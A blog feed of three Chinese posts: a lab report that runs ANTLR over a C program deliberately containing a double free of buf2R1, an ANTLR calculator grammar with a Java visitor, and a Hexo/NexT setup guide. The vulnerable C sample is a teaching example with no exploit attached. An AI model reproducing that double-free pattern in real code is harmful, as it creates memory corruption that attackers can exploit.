  <entry>
    <title>借助 ANTLR 分析代码中的漏洞</title>
    <url>/2019/06/09/experiments/antlr-2/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>通过分析特定漏洞代码特点，借助 ANTLR 分析代码中的特定漏洞。</p>
<span id="more"></span>
<h2 id="实验条件">实验条件</h2>
<ol>
<li>Windows 10 专业版</li>
<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
<li>ANTLR 环境 ——ANTLR 4</li>
</ol>
<h2 id="实验内容">实验内容</h2>
<h3 id="漏洞描述">漏洞描述</h3>
<ul>
<li>
<p>Double Free，多次释放漏洞，是对指向同一个地址的指针进行两次及以上的操作，可能会造成任意代码执行或其他非预期危害。虽然一般把它叫做 double free。其实只要是 <code>free</code> 一个指向堆内存的指针都有可能产生可以利用的漏洞。</p>
</li>
<li>
<p>一段简单的漏洞代码示例如下所示，其中对 <code>char* buf2R1</code> 所指向的内存进行了两次释放操作</p>
  <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE1 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 8) <span class="comment">//248</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> { </span><br><span class="line">	<span class="type">char</span> *buf1R1; </span><br><span class="line">	<span class="type">char</span> *buf2R1; </span><br><span class="line">	<span class="type">char</span> *buf1R2; </span><br><span class="line">	buf1R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	buf2R1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); </span><br><span class="line">	<span class="built_in">free</span>(buf1R1); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	buf1R2 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); </span><br><span class="line">	<span class="built_in">strncpy</span>(buf1R2, argv[<span class="number">1</span>], BUFSIZE1<span class="number">-1</span>); </span><br><span class="line">	<span class="built_in">free</span>(buf2R1); </span><br><span class="line">	<span class="built_in">free</span>(buf1R2); </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>double free 的原理其实和堆溢出的原理差不多，都是通过 unlink 这个双向链表删除的宏来利用的。只是 double free 需要由自己来伪造整个 chunk 并且欺骗操作系统。</p>
</li>
</ul>
<h3 id="语法识别">语法识别</h3>
<div class="note info"><p>利用 ANTLR4 的 C++ 语言语法规则文件，对漏洞代码进行分析。</p>
</div>
<ol>
<li>
<p>右键点击 g4 中的 translationunit，选择 test rule，将那个有漏洞的 C 代码制作成 expr 文件后，作为输入。</p>
</li>
<li>
<p>然后在输出位置就可以看到好大一棵 parseTree 了！右键另存为一张图。</p>
 <img data-src="/2019/06/09/experiments/antlr-2/parseTree-full.png" class="" width="500" height="500">
</li>
<li>
<p>ParseTree 全貌，其中左边的一小撮是函数头定义，右边的一大撮才是函数体定义。</p>
<ul>
<li>首先定义了三个字符指针型变量 <code>buf1R1</code>、<code>buf2R1</code>、<code>buf1R2</code><img data-src="/2019/06/09/experiments/antlr-2/1.png" class="">
</li>
<li>然后为 <code>buf1R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间，为 <code>buf2R1</code> 分配了 <code>BUFSIZE2</code> 大小的空间 <img data-src="/2019/06/09/experiments/antlr-2/3.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/4.png" class=""></li>
</ul>
</li>
<li>
<p>紧接着 <code>free</code> 掉它们 <img data-src="/2019/06/09/experiments/antlr-2/5.png" class=""></p>
</li>
<li>
<p>为 <code>buf1R2</code> 分配空间，大小为 <code>bufsize1</code></p>
<img data-src="/2019/06/09/experiments/antlr-2/6.png" class="">
</li>
<li>
<p>把 <code>argv[1]</code> 中的内容复制到 <code>buf1R2</code> 所指空间中 <img data-src="/2019/06/09/experiments/antlr-2/7.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/8.png" class=""></p>
</li>
<li>
<p>最后的两个 <code>free</code> 语句都在语法分析树的右侧 <img data-src="/2019/06/09/experiments/antlr-2/9.png" class=""></p>
</li>
</ol>
<div class="note primary"><p>从语法分析树中看不出任何问题，因为这个存在漏洞的代码是语法正确的，而且也符合 C 语言语法结构。所以我们在编写相关代码时，要自行检查指针的使用情况，最好在释放指针所指向的空间后，将其置为 <code>NULL</code>。</p>
</div>
<h2 id="实验总结">实验总结</h2>
<p>本实验中通过学习带有漏洞的 C 语言代码，了解到一些常见的二进制相关漏洞，借助到 C 语言的语法规则文件，对漏洞代码进行分解研究，了解到了我们所写的程序通过语法树展开后的样子，并试着提取其规则，编写漏洞描述 xml 文件。</p>
<p>中途遇到了 IntelliJ IDEA 无法解析规则，找不到 start rule 的问题，后来通过在 cpp14.g4 文件中右击 translationunit 规则，点击 test translationunit rule 找到了语法树的生成点，从而成功在 ANTLR Output 中看到了所生成的语法树。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>编译原理</category>
        <category>漏洞</category>
        <category>双重释放</category>
      </categories>
      <tags>
        <tag>ANTLR</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>ANTLR 语言识别工具</title>
    <url>/2019/05/20/experiments/antlr/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<ol>
<li>了解 ANTLR 语言识别工具，安装 ANTLR 环境，熟悉 ANTLR 的使用。</li>
<li>掌握使用 ANTLR 构建的语法分析器和树解析器分析语言，通过 ANTLR 实现语法分析过程。</li>
</ol>
<span id="more"></span>
<h2 id="实验条件">实验条件</h2>
<ol>
<li>Windows 10 专业版</li>
<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
<li>ANTLR 环境 ——ANTLR 4</li>
</ol>
<h2 id="实验内容">实验内容</h2>
<h3 id="安装ANTLR">安装 ANTLR</h3>
<p>个人所用的集成开发环境中提供 ANTLR 插件的安装，故可直接进入插件下载功能中下载该插件。运行时环境配置过程和安装过程不再赘述。</p>
<img data-src="/2019/05/20/experiments/antlr/1.png" class=""> 
<p>安装以后，下方工具栏会多出两个窗口：ANTLR Preview 和 Tool Output。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/2.png" class="" title="ANTLR Preivew窗口"></div><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/3.png" class="" title="Tool Output窗口"></div></div></div> 
<p>Preview 中可以显示 Parse tree，从而省去了在控制台中输入 <code>-gui</code> 命令的麻烦。</p>
<h3 id="使用ANTLR实现实数的四则运算">使用 ANTLR 实现实数的四则运算</h3>
<div class="note info"><h4 id="要求">要求</h4>
<p>创建 ANTLR 语法文件 <code>expr.g4</code>，解析如赋值语句 <code>a = 5.5</code> 和表达式 <code>a+4*3÷2-1</code> 这样的语句。</p>
<ul>
<li>要验证所编写的文法是否正确，可使用 TestRig 测试语法，在 CMD 中输入 <code>-gui</code> 可直观展示其语法分析树。</li>
<li>创建 expr 文件（如 test.expr，输入一个表达式）检验程序是否能够正确运行和计算四则算式。</li>
</ul>
</div>
<ol>
<li>
<p>文法设计</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">E -&gt; E OP E|VAR = E|E'; E'-&gt; D; OP: [+|-|*|/]; D:[0-9]+; VAR:[a-zA-Z]+; </span><br></pre></td></tr></tbody></table></figure>
<p>由此编写的 <code>expr.g4</code> 文件如下：（还考虑了一些换行及空格因素）</p>
<figure class="highlight plaintext"><figcaption><span>expr.g4</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">grammar expr; </span><br><span class="line">exprs : setExpr | calcExpr ; </span><br><span class="line">setExpr : id=ID '=' num=NUMBER ; </span><br><span class="line">calcExpr: calcExpr op=(MUL | DIV) calcExpr | calcExpr op=(ADD | SUB) calcExpr | factor ; </span><br><span class="line">factor: (sign=(ADD | SUB))? num=NUMBER // 计算因子可以是一个正数或负数 </span><br><span class="line">                           | id=ID // 计算因子可以是一个变量 ; </span><br><span class="line">WS : [ \t\n\r]+ -&gt; skip ; </span><br><span class="line">ID : [a-zA-Z]+ ; </span><br><span class="line">NUMBER : [0-9]+('.'([0-9]+)?)? ; </span><br><span class="line">ADD : '+' ; </span><br><span class="line">SUB : '-' ; </span><br><span class="line">MUL : '*' ; </span><br><span class="line">DIV : '/' ; </span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>运行结果</p>
</li>
</ol>
<div class="tabs" id="results"><ul class="nav-tabs"><li class="tab active"><a href="#results-1">赋值语句</a></li><li class="tab"><a href="#results-2">不完整的式子</a></li><li class="tab"><a href="#results-3">一个正常的运算式</a></li><li class="tab"><a href="#results-4">异常处理</a></li></ul><div class="tab-content"><div class="tab-pane active" id="results-1"><p>控制台工具显示如下<br>
<img data-src="/2019/05/20/experiments/antlr/res1-1.png" class=""></p>
<p>Main 函数如下</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a=5.5"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
<p>运行结果如下<br>
<img data-src="/2019/05/20/experiments/antlr/res1-2.png" class="" title="在visitSetExpr时触发了其中的打印操作，外层返回值为null"></p></div><div class="tab-pane" id="results-2"><div class="note "><p>本次测试的式子为 <code>a+4*3/2-1</code></p>
</div>
<p>控制台工具显示如下<br>
<img data-src="/2019/05/20/experiments/antlr/res2-1.png" class=""></p>
<p>Main 函数如下</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a+4*3/2-1"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/05/20/experiments/antlr/res2-2.png" class="" title="为了方便，在每个函数的visit函数外层加了一个控制台打印输出"> 
从输出来看，对语法树的遍历过程几乎遍及了句子的每一个结点。由于最后得到的句型是一个类似于 <code>a + &lt;数字&gt;</code> 的格式，所以它输出 <code>NaN</code>，与预期一致。
<div class="note warning"><p><code>a</code> 是与前一个赋值语句分开输入的，所以它并没有被定义值</p>
</div></div><div class="tab-pane" id="results-3"><div class="note "><p>本次测试的式子为 <code>1+4.5*2-3/3</code></p>
</div>
<p>Main 函数代码类似，控制台工具显示如下<br>
<img data-src="/2019/05/20/experiments/antlr/res3-1.png" class="" title="分析树的结构与预期一致"></p>
<p>代码输出结果如下<br>
<img data-src="/2019/05/20/experiments/antlr/res3-2.png" class=""><br>
得到了正确的输出结果，证明我们写的语法解析是正确的。</p></div><div class="tab-pane" id="results-4"><ol>
<li>针对除 0 错误，程序可以顺利显示出 <code>Infinity</code>，没有中断程序<br>
<img data-src="/2019/05/20/experiments/antlr/res4-1.png" class=""></li>
<li>输入过长也不会中断程序<br>
<img data-src="/2019/05/20/experiments/antlr/res4-2.png" class=""></li>
<li>符号错误需要单独处理<br>
<img data-src="/2019/05/20/experiments/antlr/res4-3.png" class="" title="报错：不被识别的字符（本例输入了分号），需要一个ID，NUMBER，加号或减号"></li>
</ol>
<div class="note warning"><p>这说明符号错误需要单独处理，java 中可以使用 try-catch 来完成这项工作。除此之外，也可从前端角度考虑，提前检验用户输入。</p>
</div></div></div></div>
<h2 id="总结">总结</h2>
<p>这个解析过程是怎么实现的呢？</p>
<ul>
<li>在生成 ANTLR 识别文件时，实际上生成了很多个 java 和 token 源文件。</li>
</ul>
<img data-src="/2019/05/20/experiments/antlr/end1.png" class="">
<img data-src="/2019/05/20/experiments/antlr/end2.png" class="">
<ul>
<li>
<p>有两个 tokens 文件和六个 java 文件，<code>Listener</code> 和 <code>Visitor</code> 是两个接口，<code>Listener</code> 中定义了一些退出或进入一个表达式中所进行的语法动作，<code>Visitor</code> 中定义了遍历语法树中项目的返回动作，一个语法项对应一个 <code>visit</code> 函数。具体由 <code>xxBaseListener</code> 或 <code>xxBaseVisitor</code> 来实现。默认状态下，所有的实现都是空的，我们可以扩展 <code>xxBase[Listener|Visitor]</code> 类，自己定义语法动作。本实验中，只需要实现 <code>Visitor</code> 的内容即可，不过由于上下文的关系，我们需要自建一个 <code>Context</code> 类，负责上下文内容的保存和识别。</p>
</li>
<li>
<p>重写 <code>visit</code> 函数：</p>
  <figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;你需要的返回值&gt; visit&lt;A&gt;(xxParser.&lt;A&gt;Context ctx)</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>.tokens 文件中将语法常量对应了一个整数数值，方便常量的建立。.interp 文件则记录了字面值。</p>
</li>
<li>
<p>Parser 中，对每一个语法变量，生成了很多上下文相关的方法（xxContext）。其中的某些常量在前面所述的.tokens 文件中可以找到。</p>
</li>
<li>
<p>Lexer 中，则存储了字面量及其相关方法，某些内容可在.interp 文件中找到。</p>
</li>
<li>
<p>而所有开头的 xx 来自于语法文件第一行的 grammar xx，即为语法名。</p>
</li>
<li>
<p><code>Visitor</code> 实现完成后，在主函数中建立 <code>visitor</code> 对象，调用 <code>visit</code> 语法树方法，将用户输入作为参数传入，其返回值即为语法分析结果。</p>
</li>
</ul>
<figure class="highlight java"><figcaption><span>visitor.java</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Visitor</span> <span class="keyword">extends</span> <span class="title class_">exprBaseVisitor</span>&lt;Double&gt;{</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitExprs</span><span class="params">(exprParser.ExprsContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit exprs"); </span></span><br><span class="line">		<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>)); </span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitSetExpr</span><span class="params">(exprParser.SetExprContext ctx)</span>{</span><br><span class="line">		Context.getInstance().setContext(ctx.id.getText(), ctx.num.getText());</span><br><span class="line">		System.out.println(<span class="string">"Assign operation in current line:"</span> + ctx.id.getText() + <span class="string">" = "</span> + ctx.num.getText());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitCalcExpr</span><span class="params">(exprParser.CalcExprContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit calc expr "); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">switch</span> (ctx.op.getType()) { </span><br><span class="line">				<span class="keyword">case</span> exprParser.ADD:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) + visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.SUB:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) - visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.MUL:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) * visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.DIV:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) / visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>)</span><br><span class="line">		{</span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>));</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitFactor</span><span class="params">(exprParser.FactorContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit factor"); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">1</span>)); </span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> (cc == <span class="number">2</span>) { </span><br><span class="line">			<span class="keyword">if</span> (ctx.sign.getType() == exprParser.ADD)</span><br><span class="line">				<span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.sign.getType() == exprParser.SUB) </span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span> * Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>){</span><br><span class="line">			<span class="keyword">if</span>(ctx.num != <span class="literal">null</span>) <span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">0</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.id != <span class="literal">null</span>) <span class="keyword">return</span> Context.getInstance().getValue(ctx.id.getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>目前实现的版本中，可以正确地进行运算，但还没有实现连续赋值功能，也没有考虑到多语句的分隔及分开解析，例如输入 <code>"a=1 a+1"</code> 后不能得到 <code>2</code>，可能需要修改 <code>Context</code> 类和 <code>Visitor</code> 类中的代码，使其可以记录上下文信息，将 <code>a</code> 的值存入暂存区。</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>ANTLR</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>我是如何一步步把这个博客搭建起来的</title>
    <url>/2023/04/03/works/how-i-built-the-blog/</url>
    <content><![CDATA[<p>好久不见！经过许久的折腾以后，终于闲下功夫来复盘一下博客如何部署起来的了！话不多说，这就进入主题！</p>
<span id="more"></span>
<h2 id="选择博客主题和架构">选择博客主题和架构</h2>
<p>作为一个主要承担内容输出的部分，我首先在自行开发和成熟博客框架上进行了趋于中间化的选择。成熟的框架，如 WordPress，固然可以完整提供博客所具有的全部功能，但是略显笨重，且对于本来空间就不大的云服务器更是一种考验。如果全部自己撰写的话，又会陷入到维护成本过高的问题。各种小部件的适配和样式的维护，都是一件很痛苦的事情。由此看来，静态博客生成器是一个不错的选择。</p>
<p>GitHub 上有很多成熟的静态博客生成器，如 Hexo、Jekyll、Hugo 等等。进行了一番对比后，我最终选择了 <a href="https://hexo.io">Hexo</a> 和 <a href="https://theme-next.js.org/">Hexo-next</a> 主题。Hexo 本体是基于 Node.js 的，我可以专心使用 Markdown 书写内容，而由一些 hexo 终端命令来渲染成所需的静态文档。而且，经过对一些 GitHub 仓库的浏览，我发现 Hexo 的主题和插件也是非常丰富的，可以满足我对于博客的基本需求。</p>
<h2 id="主题安装与配置">主题安装与配置</h2>
<p>Hexo 的文档很清楚，我可以直接通过 npm 命令来安装 Hexo 本体，并安装 Hexo next 主题：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">npm install hexo-theme-next</span><br></pre></td></tr></tbody></table></figure>
<p>安装完成后，博客根目录下会出现两种 yml 配置文件，一个是<code>_config.yml</code>，称为 Hexo 配置文件；一个是<code>_config.next.yml</code>，称为主题配置文件。接下来就需要对这两个文件进行深一步配置。</p>
<h3 id="Hexo配置文件的进一步配置">Hexo 配置文件的进一步配置</h3>
<p>首先是基本信息的填写，如博客标题、副标题、描述、关键词、作者、语言、时区等等。所有这些配置都将写入 HTML 的 <code>meta</code> 标签中，以便搜索引擎更好的索引博客。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">'随心记'</span>  <span class="comment"># 标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">'展现安全态度'</span>  <span class="comment"># 副标题</span></span><br><span class="line"><span class="comment"># 浏览器标签页显示的标题会是 title - subtitle 的形式</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">''</span>  <span class="comment"># 站点介绍</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">''</span>  <span class="comment"># 关键词</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">''</span>  <span class="comment"># 作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span>  <span class="comment"># 所用语言，中国大陆为zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">'Asia/Shanghai'</span>  <span class="comment"># 时区，中国大陆网站最好设置为上海时区</span></span><br></pre></td></tr></tbody></table></figure>
<p>我们安装的主题是 hexo next 主题，要在主配置文件（<code>_config.yml</code>）中写入主题的名称：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></tbody></table></figure>
<p>以上步骤结束，我们就可以通过 <code>hexo s</code> 命令来启动本地服务器，通过 <code>localhost:4000</code> 来预览博客的样子了。但是，我们还需要对主题配置文件进行进一步配置。</p>
<h3 id="next主题配置文件的进一步配置">next 主题配置文件的进一步配置</h3>
<div class="note info"><p>官方配置文档在<a href="https://theme-next.js.org/docs/theme-settings/">这里</a>，可供参考</p>
</div>
<p>我所安装的 Hexo 已经是 5.0 版本以后了，官方推荐使用替代配置文件<code>_config.next.yml</code> 来进行主题配置，以防止更新时被覆盖。</p>
<p>首先是博客主题（scheme），NexT 提供了 4 种主题（<code>Muse</code>、<code>Mist</code>、<code>Pisces</code> 和 <code>Gemini</code>），我直接选择了默认主题 <code>Muse</code>，可能我个人对这个也没啥大要求吧，哪天可以改改试试其他的。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后是暗黑模式，这可以通过 <code>darkmode</code> 来设置。我并没有改变这个选项，感觉这个主题应该还是提供一个按钮，供用户切换比较好。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">darkmode:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
<p>接下来是站点 Favicon，是浏览器标签页上会显示的小图标，需要在 <code>favicon</code> 下进行设置，并引用相关图片资源文件。目前本站还没有进行这样的设置，以后会加上。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br></pre></td></tr></tbody></table></figure>
<p>有关博客文章的版权声明，鉴于本博客大多以分享为主，我沿用了主题提供的 CC4.0 配置，意味着放开了共享和演绎（虽然我的文章一般没啥人看就是了 qwq）。这个选项的配置效果决定了文章底部的版权声明显示。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></tbody></table></figure>
<p>为了优化 SEO，OpenGraph 当然是必须配置的。这里参考 <a href="https://hexo.io/docs/helpers#open-graph">hexo 的配置文档</a>配置了一些项目。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">open_graph:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">options:</span></span><br><span class="line">  <span class="comment"># 配置twitter_id、twitter_profile等</span></span><br></pre></td></tr></tbody></table></figure>
<p>目录设置需要在 <code>menu</code> 选项下进行配置，其配置分为 <code>Key</code>、<code>link</code> 和 <code>icon</code> 三部分。其中：</p>
<ul>
<li><code>Key</code> 是目录项的名称，大小写敏感。除了 <code>home</code> 和 <code>archive</code> 以外，其他类型都需要在 <code>source</code> 文件夹下手动创建文件夹和对应的 <code>index.md</code> 文件</li>
<li><code>link</code> 是目录项的链接，是链接到本站的相对路径，在实际测试时发现也可以写站外的绝对路径</li>
<li><code>icon</code> 是目录项的 Font Awesome 图标名，可以在<a href="https://fontawesome.com/">这里</a>找到
<ul>
<li><code>link</code> 和 <code>icon</code> 之间用 <code>||</code> 分隔 </li>
</ul>
</li>
</ul>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">https://www.jason0743.space/#/about</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-sitemap</span></span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2023/04/03/works/how-i-built-the-blog/menu.png" class="" title="显示效果">
